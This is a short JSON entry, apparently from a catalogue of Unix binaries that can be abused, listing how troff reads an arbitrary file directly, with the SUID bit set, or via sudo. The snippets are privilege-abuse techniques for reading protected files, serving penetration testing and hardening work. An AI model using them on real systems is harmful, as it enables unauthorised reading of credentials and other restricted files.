{
  "functions": {
    "file-read": [
      {
        
        "code": "LFILE=file_to_read\ntroff $LFILE\n"
      }
    ],
    "suid": [
      {
        
        "code": "LFILE=file_to_read\n./troff $LFILE\n"
      }
    ],
    "sudo": [
      {
        
        "code": "LFILE=file_to_read\nsudo troff $LFILE\n"
      }
    ]
  }
}
